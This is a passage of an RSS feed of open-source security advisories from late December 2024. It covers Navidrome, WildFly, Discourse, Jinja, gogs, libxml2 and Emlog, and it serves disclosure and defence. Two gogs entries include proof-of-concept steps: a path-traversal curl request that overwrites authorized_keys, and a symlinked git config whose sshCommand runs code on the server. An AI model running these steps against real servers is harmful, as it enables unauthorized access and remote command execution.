                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/navidrome/navidrome/security/advisories/GHSA-xwx7-p63r-2rj8'>https://github.com/navidrome/navidrome/security/advisories/GHSA-xwx7-p63r-2rj8</a></li><li>- <a target='_blank' href='https://github.com/navidrome/navidrome/commit/7f030b0859653593fd2ac0df69f4a313f9caf9ff'>https://github.com/navidrome/navidrome/commit/7f030b0859653593fd2ac0df69f4a313f9caf9ff</a></li><li>- <a target='_blank' href='https://github.com/navidrome/navidrome/commit/9cbdb20a318a49daf95888b1fd207d4d729b55f1'>https://github.com/navidrome/navidrome/commit/9cbdb20a318a49daf95888b1fd207d4d729b55f1</a></li><li>- <a target='_blank' href='https://github.com/navidrome/navidrome'>https://github.com/navidrome/navidrome</a></li><li>- <a target='_blank' href='https://github.com/navidrome/navidrome/releases/tag/v0.54.1'>https://github.com/navidrome/navidrome/releases/tag/v0.54.1</a></li><li>- <a target='_blank' href='https://pkg.go.dev/vuln/GO-2024-3357'>https://pkg.go.dev/vuln/GO-2024-3357</a></li></ul><br>
                            <b>Details:</b> <b>Navidrome Stores JWT Secret in Plaintext in navidrome.db</b><br>Navidrome stores the JWT secret in plaintext in the `navidrome.db` database file under the `property` table. This practice introduces a security risk because anyone with access to the database file can retrieve the secret.
The JWT secret is critical for the authentication and authorization system. If exposed, an attacker could:
- Forge valid tokens to impersonate users, including administrative accounts.
- Gain unauthorized access to sensitive data or perform privileged actions.
This vulnerability has been tested on the latest version of Navidrome and poses a significant risk in environments where the database file is not adequately secured.

![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;29aae867-f21f-4d70-bda0-d2bb87d754d9)

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-64gp-r758-8pfm: 6.9 | <b>Cross Site Scripting (XSS) vulnerability while uploading content to a new deployment</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-64gp-r758-8pfm</link>
                    <pubDate>2024-12-23T20:15:16Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-64gp-r758-8pfm'>https://osv.dev/vulnerability/GHSA-64gp-r758-8pfm</a><br>
                            <b>Published:</b> 2024-12-23T20:15:16Z<br>
                            <b>Severity:</b> 6.9<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/hal/console/security/advisories/GHSA-64gp-r758-8pfm'>https://github.com/hal/console/security/advisories/GHSA-64gp-r758-8pfm</a></li><li>- <a target='_blank' href='https://github.com/hal/console'>https://github.com/hal/console</a></li><li>- <a target='_blank' href='https://github.com/hal/console/releases/tag/v3.7.7'>https://github.com/hal/console/releases/tag/v3.7.7</a></li><li>- <a target='_blank' href='https://issues.redhat.com/browse/WFLY-19969'>https://issues.redhat.com/browse/WFLY-19969</a></li></ul><br>
                            <b>Details:</b> <b>Cross Site Scripting (XSS) vulnerability while uploading content to a new deployment</b><br>A vulnerability was found in the WildFly management console. A user may perform cross-site scripting in the deployment system. An attacker (or insider) may execute a malicious payload which could trigger an undesired behavior against the server.

### Impact
Cross-site scripting (XSS) vulnerability in the management console.

### Patches
Fixed in [HAL 3.7.7.Final](https:&#x2F;&#x2F;github.com&#x2F;hal&#x2F;console&#x2F;releases&#x2F;tag&#x2F;v3.7.7) 

### Workarounds
No workaround available

### References
See also: https:&#x2F;&#x2F;issues.redhat.com&#x2F;browse&#x2F;WFLY-19969

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-discourse-2024-49765: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-discourse-2024-49765</link>
                    <pubDate>2024-12-23T19:10:38.115Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-discourse-2024-49765'>https://osv.dev/vulnerability/BIT-discourse-2024-49765</a><br>
                            <b>Published:</b> 2024-12-23T19:10:38.115Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/discourse/discourse/security/advisories/GHSA-v8rf-pvgm-xxf2'>https://github.com/discourse/discourse/security/advisories/GHSA-v8rf-pvgm-xxf2</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Discourse is an open source platform for community discussion. Sites that are using discourse connect but still have local logins enabled could allow attackers to bypass discourse connect to create accounts and login. This problem is patched in the latest version of Discourse. Users unable to upgrade who are using discourse connect may disable all other login methods as a workaround.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-discourse-2024-52589: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-discourse-2024-52589</link>
                    <pubDate>2024-12-23T19:10:30.112Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-discourse-2024-52589'>https://osv.dev/vulnerability/BIT-discourse-2024-52589</a><br>
                            <b>Published:</b> 2024-12-23T19:10:30.112Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/discourse/discourse/security/advisories/GHSA-cqw6-rr3v-8fff'>https://github.com/discourse/discourse/security/advisories/GHSA-cqw6-rr3v-8fff</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Discourse is an open source platform for community discussion. Moderators can see the Screened emails list in the admin dashboard, and through that can learn the email of a user. This problem is patched in the latest version of Discourse. Users unable to upgrade should remove moderator role from untrusted users.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-discourse-2024-52794: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-discourse-2024-52794</link>
                    <pubDate>2024-12-23T19:10:22.128Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-discourse-2024-52794'>https://osv.dev/vulnerability/BIT-discourse-2024-52794</a><br>
                            <b>Published:</b> 2024-12-23T19:10:22.128Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/discourse/discourse/security/advisories/GHSA-m3v4-v2rp-hfm9'>https://github.com/discourse/discourse/security/advisories/GHSA-m3v4-v2rp-hfm9</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Discourse is an open source platform for community discussion. Users clicking on the lightbox thumbnails could be affected. This problem is patched in the latest version of Discourse. Users are advised to upgrade. There are no known workarounds for this vulnerability.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-discourse-2024-53991: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-discourse-2024-53991</link>
                    <pubDate>2024-12-23T19:10:14.117Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-discourse-2024-53991'>https://osv.dev/vulnerability/BIT-discourse-2024-53991</a><br>
                            <b>Published:</b> 2024-12-23T19:10:14.117Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/discourse/discourse/security/advisories/GHSA-567m-82f6-56rv'>https://github.com/discourse/discourse/security/advisories/GHSA-567m-82f6-56rv</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Discourse is an open source platform for community discussion. This vulnerability only impacts Discourse instances configured to use `FileStore::LocalStore` which means uploads and backups are stored locally on disk. If an attacker knows the name of the Discourse backup file, the attacker can trick nginx into sending the Discourse backup file with a well crafted request. This issue is patched in the latest stable, beta and tests-passed versions of Discourse. Users are advised to upgrade. Users unable to upgrade can either 1. Download all local backups on to another storage device, disable the `enable_backups` site setting and delete all backups until the site has been upgraded to pull in the fix. Or  2. Change the `backup_location` site setting to `s3` so that backups are stored and downloaded directly from S3.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-r87q-fj25-f8jf: 6.8 | <b>Cross-site Scripting vulnerability in SimpleXLSXEx::readThemeColors, SimpleXLSXEx::getColorValue and SimpleXLSX::toHTMLEx</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-r87q-fj25-f8jf</link>
                    <pubDate>2024-12-23T18:18:54Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-r87q-fj25-f8jf'>https://osv.dev/vulnerability/GHSA-r87q-fj25-f8jf</a><br>
                            <b>Published:</b> 2024-12-23T18:18:54Z<br>
                            <b>Severity:</b> 6.8<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/shuchkin/simplexlsx/security/advisories/GHSA-r87q-fj25-f8jf'>https://github.com/shuchkin/simplexlsx/security/advisories/GHSA-r87q-fj25-f8jf</a></li><li>- <a target='_blank' href='https://github.com/shuchkin/simplexlsx/commit/71a5e3d40d14e33161f8a40b3fd02de542218ef0'>https://github.com/shuchkin/simplexlsx/commit/71a5e3d40d14e33161f8a40b3fd02de542218ef0</a></li><li>- <a target='_blank' href='https://github.com/shuchkin/simplexlsx'>https://github.com/shuchkin/simplexlsx</a></li></ul><br>
                            <b>Details:</b> <b>Cross-site Scripting vulnerability in SimpleXLSXEx::readThemeColors, SimpleXLSXEx::getColorValue and SimpleXLSX::toHTMLEx</b><br>### Impact
When calling the extended toHTMLEx method, it is possible to execute arbitrary JavaScript code.

### Patches
The supplied patch resolves this vulnerability for SimpleXLSX. Use 1.1.13

### Workarounds
Don&#x27;t use data publication via toHTMLEx

***
This vulnerability was discovered by Aleksey Solovev (Positive Technologies)

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-q2x7-8rv6-6q7h: 7.8 | <b>Jinja has a sandbox breakout through indirect reference to format method</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-q2x7-8rv6-6q7h</link>
                    <pubDate>2024-12-23T17:56:08Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-q2x7-8rv6-6q7h'>https://osv.dev/vulnerability/GHSA-q2x7-8rv6-6q7h</a><br>
                            <b>Published:</b> 2024-12-23T17:56:08Z<br>
                            <b>Severity:</b> 7.8<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/pallets/jinja/security/advisories/GHSA-q2x7-8rv6-6q7h'>https://github.com/pallets/jinja/security/advisories/GHSA-q2x7-8rv6-6q7h</a></li><li>- <a target='_blank' href='https://github.com/pallets/jinja/commit/48b0687e05a5466a91cd5812d604fa37ad0943b4'>https://github.com/pallets/jinja/commit/48b0687e05a5466a91cd5812d604fa37ad0943b4</a></li><li>- <a target='_blank' href='https://github.com/pallets/jinja'>https://github.com/pallets/jinja</a></li><li>- <a target='_blank' href='https://github.com/pallets/jinja/releases/tag/3.1.5'>https://github.com/pallets/jinja/releases/tag/3.1.5</a></li></ul><br>
                            <b>Details:</b> <b>Jinja has a sandbox breakout through indirect reference to format method</b><br>An oversight in how the Jinja sandboxed environment detects calls to `str.format` allows an attacker that controls the content of a template to execute arbitrary Python code.

To exploit the vulnerability, an attacker needs to control the content of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates.

Jinja&#x27;s sandbox does catch calls to `str.format` and ensures they don&#x27;t escape the sandbox. However, it&#x27;s possible to store a reference to a malicious string&#x27;s `format` method, then pass that to a filter that calls it. No such filters are built-in to Jinja, but could be present through custom filters in an application. After the fix, such indirect calls are also handled by the sandbox.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-gmj6-6f8f-6699: 8.8 | <b>Jinja has a sandbox breakout through malicious filenames</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-gmj6-6f8f-6699</link>
                    <pubDate>2024-12-23T17:54:12Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-gmj6-6f8f-6699'>https://osv.dev/vulnerability/GHSA-gmj6-6f8f-6699</a><br>
                            <b>Published:</b> 2024-12-23T17:54:12Z<br>
                            <b>Severity:</b> 8.8<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/pallets/jinja/security/advisories/GHSA-gmj6-6f8f-6699'>https://github.com/pallets/jinja/security/advisories/GHSA-gmj6-6f8f-6699</a></li><li>- <a target='_blank' href='https://github.com/pallets/jinja/issues/1792'>https://github.com/pallets/jinja/issues/1792</a></li><li>- <a target='_blank' href='https://github.com/pallets/jinja/commit/767b23617628419ae3709ccfb02f9602ae9fe51f'>https://github.com/pallets/jinja/commit/767b23617628419ae3709ccfb02f9602ae9fe51f</a></li><li>- <a target='_blank' href='https://github.com/pallets/jinja'>https://github.com/pallets/jinja</a></li><li>- <a target='_blank' href='https://github.com/pallets/jinja/releases/tag/3.1.5'>https://github.com/pallets/jinja/releases/tag/3.1.5</a></li></ul><br>
                            <b>Details:</b> <b>Jinja has a sandbox breakout through malicious filenames</b><br>A bug in the Jinja compiler allows an attacker that controls both the content and filename of a template to execute arbitrary Python code, regardless of if Jinja&#x27;s sandbox is used.

To exploit the vulnerability, an attacker needs to control both the filename and the contents of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates where the template author can also choose the template filename.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-qf5v-rp47-55gg: 8.7 | <b>Path Traversal in file update API in gogs</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-qf5v-rp47-55gg</link>
                    <pubDate>2024-12-23T17:53:16Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-qf5v-rp47-55gg'>https://osv.dev/vulnerability/GHSA-qf5v-rp47-55gg</a><br>
                            <b>Published:</b> 2024-12-23T17:53:16Z<br>
                            <b>Severity:</b> 8.7<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/gogs/gogs/security/advisories/GHSA-qf5v-rp47-55gg'>https://github.com/gogs/gogs/security/advisories/GHSA-qf5v-rp47-55gg</a></li><li>- <a target='_blank' href='https://github.com/gogs/gogs/issues/7582'>https://github.com/gogs/gogs/issues/7582</a></li><li>- <a target='_blank' href='https://github.com/gogs/gogs/pull/7859'>https://github.com/gogs/gogs/pull/7859</a></li><li>- <a target='_blank' href='https://github.com/gogs/gogs/commit/9a9388ace25bd646f5098cb9193d983332c34e41'>https://github.com/gogs/gogs/commit/9a9388ace25bd646f5098cb9193d983332c34e41</a></li><li>- <a target='_blank' href='https://github.com/gogs/gogs'>https://github.com/gogs/gogs</a></li></ul><br>
                            <b>Details:</b> <b>Path Traversal in file update API in gogs</b><br>### Impact

The malicious user is able to write a file to an arbitrary path on the server to gain SSH access to the server. 

### Patches

Writing files outside repository Git directory has been prohibited via the repository file update API (https:&#x2F;&#x2F;github.com&#x2F;gogs&#x2F;gogs&#x2F;pull&#x2F;7859). Users should upgrade to 0.13.1 or the latest 0.14.0+dev.

### Workarounds

No viable workaround available, please only grant access to trusted users to your Gogs instance on affected versions.

### References

n&#x2F;a

### Proof of Concept

1. Generate a Personal Access Tokens
2. Edit any file on the server with this

    ```bash
    curl -v --path-as-is -X PUT --url &quot;http:&#x2F;&#x2F;localhost:10880&#x2F;api&#x2F;v1&#x2F;repos&#x2F;Test&#x2F;bbcc&#x2F;contents&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;home&#x2F;git&#x2F;.ssh&#x2F;authorized_keys&quot; \
    -H &quot;Authorization: token eaac23cf58fc76bbaecd686ec52cd44d903db9bf&quot; \
    -H &quot;Content-Type: application&#x2F;json&quot; \
    --data &#x27;{
      &quot;message&quot;: &quot;an&quot;,
      &quot;content&quot;: &quot;&amp;lt;base64encoded: your ssh pub key&amp;gt;&quot;
    }&#x27;
    ```

3. ssh connect to remote server

    ```bash
    ssh -i temp git@localhost -p 10022
    ```

### For more information
If you have any questions or comments about this advisory, please post on https:&#x2F;&#x2F;github.com&#x2F;gogs&#x2F;gogs&#x2F;issues&#x2F;7582.

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-r7j8-5h9c-f6fx: 9.8 | <b>Remote Command Execution in file editing in gogs</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-r7j8-5h9c-f6fx</link>
                    <pubDate>2024-12-23T17:53:01Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-r7j8-5h9c-f6fx'>https://osv.dev/vulnerability/GHSA-r7j8-5h9c-f6fx</a><br>
                            <b>Published:</b> 2024-12-23T17:53:01Z<br>
                            <b>Severity:</b> 9.8<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/gogs/gogs/security/advisories/GHSA-r7j8-5h9c-f6fx'>https://github.com/gogs/gogs/security/advisories/GHSA-r7j8-5h9c-f6fx</a></li><li>- <a target='_blank' href='https://github.com/gogs/gogs/issues/7582'>https://github.com/gogs/gogs/issues/7582</a></li><li>- <a target='_blank' href='https://github.com/gogs/gogs/pull/7857'>https://github.com/gogs/gogs/pull/7857</a></li><li>- <a target='_blank' href='https://github.com/gogs/gogs/commit/c94baec9ca923f38c19f0c7c5af722b9ec04022a'>https://github.com/gogs/gogs/commit/c94baec9ca923f38c19f0c7c5af722b9ec04022a</a></li><li>- <a target='_blank' href='https://github.com/gogs/gogs'>https://github.com/gogs/gogs</a></li></ul><br>
                            <b>Details:</b> <b>Remote Command Execution in file editing in gogs</b><br>### Impact

The malicious user is able to commit and edit a crafted symlink file to a repository to gain SSH access to the server. 

### Patches

Editing symlink while changing the file name has been prohibited via the repository web editor (https:&#x2F;&#x2F;github.com&#x2F;gogs&#x2F;gogs&#x2F;pull&#x2F;7857). Users should upgrade to 0.13.1 or the latest 0.14.0+dev.

### Workarounds

No viable workaround available, please only grant access to trusted users to your Gogs instance on affected versions.

### References

n&#x2F;a

### Proof of Concept

1. Create two repositories, upload something to the first repository, edit any file, and save it on the webpage.
2. In the second repository, create a symbolic link to the file you need to edit:
    ```bash
    $ ln -s &#x2F;data&#x2F;gogs&#x2F;data&#x2F;tmp&#x2F;local-repo&#x2F;1&#x2F;.git&#x2F;config test
    $ ls -la
    total 8
    drwxr-xr-x   5 dd  staff  160 Oct 27 19:09 .
    drwxr-xr-x   4 dd  staff  128 Oct 27 19:06 ..
    drwxr-xr-x  12 dd  staff  384 Oct 27 19:09 .git
    -rw-r--r--   1 dd  staff   12 Oct 27 19:06 README.md
    lrwxr-xr-x   1 dd  staff   44 Oct 27 19:09 test -&amp;gt; &#x2F;data&#x2F;gogs&#x2F;data&#x2F;tmp&#x2F;local-repo&#x2F;1&#x2F;.git&#x2F;config
    $ git add .
    $ git commit -m &#x27;ddd&#x27;
    $ git push -f
    ```

3. Go back to the webpage, edit the symbolic file in the second repository, with the following content, change the filename, and save (here you can notice, with filename changed the symbolic file edit limit is bypassed)
    ```
    [core]
    repositoryformatversion = 0
    filemode = true
    bare = false
    logallrefupdates = true
    ignorecase = true
    precomposeunicode = true
    sshCommand = echo pwnned &amp;gt; &#x2F;tmp&#x2F;poc
    [remote &quot;origin&quot;]
    url = [git@github.com](mailto:git@github.com):torvalds&#x2F;linux.git
    fetch = +refs&#x2F;heads&#x2F;*:refs&#x2F;remotes&#x2F;origin&#x2F;*
    [branch &quot;master&quot;]
    remote = origin
    merge = refs&#x2F;heads&#x2F;master
    ```

4. Go back to the first repo, edit something, and commit again, you can notice a file called `&#x2F;tmp&#x2F;poc` created on the server.

### For more information
If you have any questions or comments about this advisory, please post on https:&#x2F;&#x2F;github.com&#x2F;gogs&#x2F;gogs&#x2F;issues&#x2F;7582.

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2024-40896: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2024-40896</link>
                    <pubDate>2024-12-23T17:15:08Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2024-40896'>https://osv.dev/vulnerability/CVE-2024-40896</a><br>
                            <b>Published:</b> 2024-12-23T17:15:08Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://gitlab.gnome.org/GNOME/libxml2/-/commit/1a8932303969907f6572b1b6aac4081c56adb5c6'>https://gitlab.gnome.org/GNOME/libxml2/-/commit/1a8932303969907f6572b1b6aac4081c56adb5c6</a></li><li>- <a target='_blank' href='https://gitlab.gnome.org/GNOME/libxml2/-/issues/761'>https://gitlab.gnome.org/GNOME/libxml2/-/issues/761</a></li></ul><br>
                            <b>Details:</b> <b></b><br>In libxml2 2.11 before 2.11.9, 2.12 before 2.12.9, and 2.13 before 2.13.3, the SAX parser can produce events for external entities even if custom SAX handlers try to override entity content (by setting &quot;checked&quot;). This makes classic XXE attacks possible.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2024-54148: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2024-54148</link>
                    <pubDate>2024-12-23T16:15:07Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2024-54148'>https://osv.dev/vulnerability/CVE-2024-54148</a><br>
                            <b>Published:</b> 2024-12-23T16:15:07Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/gogs/gogs/issues/7582'>https://github.com/gogs/gogs/issues/7582</a></li><li>- <a target='_blank' href='https://github.com/gogs/gogs/pull/7857'>https://github.com/gogs/gogs/pull/7857</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Gogs is an open source self-hosted Git service. A malicious user is able to commit and edit a crafted symlink file to a repository to gain SSH access to the server. The vulnerability is fixed in 0.13.1.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2024-55947: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2024-55947</link>
                    <pubDate>2024-12-23T16:15:07Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2024-55947'>https://osv.dev/vulnerability/CVE-2024-55947</a><br>
                            <b>Published:</b> 2024-12-23T16:15:07Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/gogs/gogs/issues/7582'>https://github.com/gogs/gogs/issues/7582</a></li><li>- <a target='_blank' href='https://github.com/gogs/gogs/pull/7859'>https://github.com/gogs/gogs/pull/7859</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Gogs is an open source self-hosted Git service. A malicious user is able to write a file to an arbitrary path on the server to gain SSH access to the server. The vulnerability is fixed in 0.13.1.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2024-53256: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2024-53256</link>
                    <pubDate>2024-12-23T16:15:06Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2024-53256'>https://osv.dev/vulnerability/CVE-2024-53256</a><br>
                            <b>Published:</b> 2024-12-23T16:15:06Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> c<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/rizinorg/rizin/blob/be24ca8879ed9c58f288bdf21c271b6294720da4/librz/main/rizin.c#L1275-L1278'>https://github.com/rizinorg/rizin/blob/be24ca8879ed9c58f288bdf21c271b6294720da4/librz/main/rizin.c#L1275-L1278</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Rizin is a UNIX-like reverse engineering framework and command-line toolset. `rizin.c` still had an old snippet of code which suffered a command injection due the usage of `rz_core_cmdf` to invoke the command `m` which was removed in v0.1.x. A malicious binary defining `bclass` (part of RzBinInfo) is executed if `rclass` (part of RzBinInfo) is set to `fs`; the vulnerability can be exploited by any bin format where `bclass` and `rclass` are user defined. This vulnerability is fixed in 0.7.4.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>OSV-2024-1397: 0 | <b>Security exception in org.springframework.expression.spel.ast.OpPlus.getValueInternal</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#OSV-2024-1397</link>
                    <pubDate>2024-12-23T00:07:37.280500Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/OSV-2024-1397'>https://osv.dev/vulnerability/OSV-2024-1397</a><br>
                            <b>Published:</b> 2024-12-23T00:07:37.280500Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=385326423'>https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=385326423</a></li></ul><br>
                            <b>Details:</b> <b>Security exception in org.springframework.expression.spel.ast.OpPlus.getValueInternal</b><br>OSS-Fuzz report: https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;oss-fuzz&#x2F;issues&#x2F;detail?id=385326423

```
Crash type: Security exception
Crash state:
org.springframework.expression.spel.ast.OpPlus.getValueInternal
java.base&#x2F;java.util.HashMap.get
org.springframework.core.convert.TypeDescriptor.valueOf
```

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2024-12846: 4.8 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2024-12846</link>
                    <pubDate>2024-12-21T05:15:07Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2024-12846'>https://osv.dev/vulnerability/CVE-2024-12846</a><br>
                            <b>Published:</b> 2024-12-21T05:15:07Z<br>
                            <b>Severity:</b> 4.8<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://vuldb.com/?ctiid.289082'>https://vuldb.com/?ctiid.289082</a></li><li>- <a target='_blank' href='https://vuldb.com/?id.289082'>https://vuldb.com/?id.289082</a></li><li>- <a target='_blank' href='https://vuldb.com/?submit.462614'>https://vuldb.com/?submit.462614</a></li><li>- <a target='_blank' href='https://github.com/emlog/emlog/issues/307'>https://github.com/emlog/emlog/issues/307</a></li></ul><br>
                            <b>Details:</b> <b></b><br>A vulnerability, which was classified as problematic, has been found in Emlog Pro up to 2.4.1. Affected by this issue is some unknown functionality of the file &#x2F;admin&#x2F;link.php. The manipulation of the argument siteurl&#x2F;icon leads to cross site scripting. The attack may be launched remotely. The exploit has been disclosed to the public and may be used.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2024-12845: 6.1 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2024-12845</link>
                    <pubDate>2024-12-20T22:15:24Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2024-12845'>https://osv.dev/vulnerability/CVE-2024-12845</a><br>
                            <b>Published:</b> 2024-12-20T22:15:24Z<br>
                            <b>Severity:</b> 6.1<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/emlog/emlog/issues/306'>https://github.com/emlog/emlog/issues/306</a></li><li>- <a target='_blank' href='https://vuldb.com/?ctiid.289081'>https://vuldb.com/?ctiid.289081</a></li><li>- <a target='_blank' href='https://vuldb.com/?id.289081'>https://vuldb.com/?id.289081</a></li><li>- <a target='_blank' href='https://vuldb.com/?submit.462477'>https://vuldb.com/?submit.462477</a></li></ul><br>
                            <b>Details:</b> <b></b><br>A vulnerability classified as problematic was found in Emlog Pro up to 2.4.1. Affected by this vulnerability is an unknown functionality in the library &#x2F;include&#x2F;lib&#x2F;common.php. The manipulation of the argument msg leads to cross site scripting. The attack can be launched remotely. The exploit has been disclosed to the public and may be used.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2024-12843: 6.1 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2024-12843</link>
                    <pubDate>2024-12-20T21:15:07Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2024-12843'>https://osv.dev/vulnerability/CVE-2024-12843</a><br>
                            <b>Published:</b> 2024-12-20T21:15:07Z<br>
                            <b>Severity:</b> 6.1<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/emlog/emlog/issues/305'>https://github.com/emlog/emlog/issues/305</a></li><li>- <a target='_blank' href='https://vuldb.com/?ctiid.289079'>https://vuldb.com/?ctiid.289079</a></li><li>- <a target='_blank' href='https://vuldb.com/?id.289079'>https://vuldb.com/?id.289079</a></li></ul><br>
                            <b>Details:</b> <b></b><br>A vulnerability was found in Emlog Pro up to 2.4.1. It has been rated as problematic. This issue affects some unknown processing of the file &#x2F;admin&#x2F;plugin.php. The manipulation of the argument filter leads to cross site scripting. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2024-12844: 6.1 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2024-12844</link>
                    <pubDate>2024-12-20T21:15:07Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2024-12844'>https://osv.dev/vulnerability/CVE-2024-12844</a><br>
                            <b>Published:</b> 2024-12-20T21:15:07Z<br>
                            <b>Severity:</b> 6.1<br>
                            <b>Langs:</b> <br>
